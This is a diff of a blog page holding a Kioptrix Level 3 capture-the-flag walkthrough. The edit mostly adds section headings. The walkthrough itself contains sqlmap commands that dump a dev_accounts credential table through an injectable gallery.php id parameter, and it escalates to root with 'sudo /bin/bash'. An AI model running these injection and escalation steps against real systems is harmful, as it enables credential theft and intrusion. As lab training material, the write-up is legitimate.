@@ -32,7 +32,7 @@
 <meta property="og:image" content="http://hunterluker.github.io/2021/02/27/kioptrix-3/sudoers.png">
 <meta property="og:image" content="http://hunterluker.github.io/2021/02/27/kioptrix-3/root.png">
 <meta property="article:published_time" content="2021-02-27T17:20:06.000Z">
-<meta property="article:modified_time" content="2021-03-06T23:54:02.665Z">
+<meta property="article:modified_time" content="2021-03-07T19:45:58.536Z">
 <meta property="article:author" content="Hunter Luker">
 <meta property="article:tag" content="kioptrix">
 <meta property="article:tag" content="oscp">
@@ -129,7 +129,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kioptrix-Level-3-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Kioptrix Level 3 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netdiscover"><span class="toc-number">1.1.1.</span> <span class="toc-text">netdiscover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirb"><span class="toc-number">1.2.2.</span> <span class="toc-text">dirb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.2.3.</span> <span class="toc-text">sqlmap</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kioptrix-Level-3-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Kioptrix Level 3 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netdiscover"><span class="toc-number">1.1.1.</span> <span class="toc-text">netdiscover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirb"><span class="toc-number">1.2.2.</span> <span class="toc-text">dirb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#virtual-hosts"><span class="toc-number">1.2.3.</span> <span class="toc-text">virtual hosts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.3.1.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root"><span class="toc-number">1.3.2.</span> <span class="toc-text">root</span></a></li></ol></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -193,7 +193,7 @@
 <p>Vising /gallery it seems the page is broken, so I open the page source.</p>
 <img src="/2021/02/27/kioptrix-3/page-source.png" class="" title="page-source">
 
-<p>The page source reveals a “kioptrix3<span>.</span>com” url that seems to be a potential virtual host.</p>
+<h3 id="virtual-hosts"><a href="#virtual-hosts" class="headerlink" title="virtual hosts"></a>virtual hosts</h3><p>The page source reveals a “kioptrix3<span>.</span>com” url that seems to be a potential virtual host.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
 <img src="/2021/02/27/kioptrix-3/etc-hosts.png" class="" title="etc-hosts">
 
@@ -206,7 +206,7 @@
 <p>After adding a quotation to the end of the id param, we do see the site respond with an sql error verifying it is indeed vulnerable to injection.</p>
 <img src="/2021/02/27/kioptrix-3/sqli-test.png" class="" title="sqli-test">
 
-<p>Starting up sqlmap to automate the process I find the database gallery and a table inside it called dev_accounts.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Starting up sqlmap to automate the process I find the database gallery and a table inside it called dev_accounts.</p>
 <h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># First run to check parameter id</span><br><span class="line">sqlmap http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 -p id</span><br><span class="line"></span><br><span class="line"># Second run to list all databases</span><br><span class="line">sqlmap http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 --dbs</span><br><span class="line"></span><br><span class="line"># Third run to list tables in database gallery</span><br><span class="line">sqlmap http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 -D gallery --tables</span><br><span class="line"></span><br><span class="line"># Fourth run to dump all data in dev_accounts table</span><br><span class="line">sqlmap http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 -D gallery -T dev_accounts --dump</span><br></pre></td></tr></table></figure>
 <img src="/2021/02/27/kioptrix-3/sqlmap.png" class="" title="sqlmap">
 
@@ -233,7 +233,7 @@
 <p>Searching for the /etc/sudoers file and hitting enter I’m presented with the sudoers file.</p>
 <img src="/2021/02/27/kioptrix-3/sudoers.png" class="" title="sudoers">
 
-<p>I see my current user loneferret has sudo privileges to run /bin/bash.</p>
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>I see my current user loneferret has sudo privileges to run /bin/bash.</p>
 <img src="/2021/02/27/kioptrix-3/root.png" class="" title="root">
 
 <p>Exiting the “sudo ht” application I run “sudo /bin/bash” and I’m now root. I finish by changing directories to /root and catting the Congrats.txt file to complete the box.</p>
@@ -268,7 +268,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kioptrix-Level-3-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Kioptrix Level 3 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netdiscover"><span class="toc-number">1.1.1.</span> <span class="toc-text">netdiscover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirb"><span class="toc-number">1.2.2.</span> <span class="toc-text">dirb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.2.3.</span> <span class="toc-text">sqlmap</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kioptrix-Level-3-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Kioptrix Level 3 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netdiscover"><span class="toc-number">1.1.1.</span> <span class="toc-text">netdiscover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirb"><span class="toc-number">1.2.2.</span> <span class="toc-text">dirb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#virtual-hosts"><span class="toc-number">1.2.3.</span> <span class="toc-text">virtual hosts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.3.1.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root"><span class="toc-number">1.3.2.</span> <span class="toc-text">root</span></a></li></ol></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
